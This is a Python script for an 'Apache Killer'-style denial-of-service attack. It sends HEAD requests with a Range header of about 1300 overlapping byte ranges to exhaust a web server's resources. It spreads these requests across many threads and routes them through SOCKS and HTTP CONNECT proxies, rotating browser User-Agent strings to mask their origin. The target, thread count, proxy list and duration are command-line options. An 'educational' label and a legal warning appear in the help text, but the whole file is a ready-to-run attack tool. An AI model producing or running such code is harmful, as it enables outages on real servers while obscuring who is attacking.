import socket
import threading
import random
import time
import argparse
from urllib.parse import urlparse
import socks # PySocks library

# --- Configuration & Globals ---

# List of User-Agent strings to mimic different browsers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    # ... (more user agents can be added from the C code)
]

# Global list to hold proxy information
PROXIES = []
# Global flag to control thread execution
ATTACK_RUNNING = True

# --- Core Attack Logic ---

def generate_range_header():
    """
    Generates the malicious 'Range' header value that exhausts server resources.
    This is the core of the Apache Killer-style attack.
    """
    byte_ranges = "0-"
    # Generate a large number of overlapping byte ranges
    for i in range(1300):
        byte_ranges += f",5-{i}"
    return byte_ranges

def get_target_info(url):
    """Parses the URL to get host and port."""
    parsed_url = urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80 # Default to port 80 if not specified
    if not host:
        raise ValueError("Could not parse hostname from URL")
    return host, port, socket.gethostbyname(host)

def attacker_thread():
    """
    The main function for each attacker thread.
    It continuously sends malicious requests through different proxies.
    """
    # Generate the malicious headers once per thread
    range_header = generate_range_header()

    while ATTACK_RUNNING:
        proxy = random.choice(PROXIES)
        proxy_ip, proxy_port, proxy_type = proxy['ip'], proxy['port'], proxy['type'].lower()
        
        s = None
        try:
            # Set up the socket based on the proxy type
            if 'socks5' in proxy_type:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            elif 'socks4' in proxy_type:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
            elif 'connect' in proxy_type or 'tunnel' in proxy_type:
                # HTTP CONNECT proxy requires a manual handshake
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((proxy_ip, proxy_port))
                connect_req = f"CONNECT {TARGET_IP}:{TARGET_PORT} HTTP/1.0\r\n\r\n".encode('utf-8')
                s.sendall(connect_req)
                response = s.recv(1024)
                if not b"200 OK" in response:
                    # Failed to tunnel, skip this proxy for now
                    s.close()
                    continue
            else: # No proxy or unknown type
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the final target
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Construct and send the malicious payload
            user_agent = random.choice(USER_AGENTS)
            payload = (
                f"HEAD / HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Range: bytes={range_header}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode('utf-8')

            s.sendall(payload)
            
        except (socket.error, socks.ProxyError, socket.timeout) as e:
            # If any connection error occurs, we just ignore it and move on
            # In a real attack, the proxy might be marked as 'bad' and retried later
            pass
        finally:
            if s:
                s.close()
        
        # A small delay to prevent overwhelming the local CPU/network instantly
        time.sleep(0.05)


# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(
        description="Python equivalent of a DDoS tool for educational purposes.",
        epilog="WARNING: Use this tool responsibly and legally. Unauthorized attacks are illegal."
    )
    parser.add_argument("url", help="The target URL (e.g., http://example.com)")
    parser.add_argument("threads", type=int, help="Number of attacker threads to launch.")
    parser.add_argument("proxy_file", help="File containing a list of proxies (format: ip:port:type).")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds.")
    
    args = parser.parse_args()

    # --- Setup ---
    print("--- DDoS Tool (Educational Version) ---")
    
    # Parse proxy file
    try:
        with open(args.proxy_file, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) == 3:
                    PROXIES.append({'ip': parts[0], 'port': int(parts[1]), 'type': parts[2]})
        if not PROXIES:
            print("Error: Proxy file is empty or malformed. Exiting.")
            return
        print(f"Successfully loaded {len(PROXIES)} proxies.")
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return

    # Set global target info
    global TARGET_HOST, TARGET_PORT, TARGET_IP
    try:
        TARGET_HOST, TARGET_PORT, TARGET_IP = get_target_info(args.url)
        print(f"Target set to {TARGET_HOST} ({TARGET_IP}) on port {TARGET_PORT}.")
    except Exception as e:
        print(f"Error: Invalid target URL. {e}")
        return
        
    # --- Launch Attack ---
    print(f"\nStarting attack with {args.threads} threads for {args.duration} seconds.")
    print("Press Ctrl+C to stop early.")
    
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attacker_thread)
        t.daemon = True # Allows main thread to exit even if attack threads are running
        t.start()
        threads.append(t)

    # --- Wait for duration and Cleanup ---
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        print("Attack finished. Shutting down threads.")

if __name__ == "__main__":
    main()
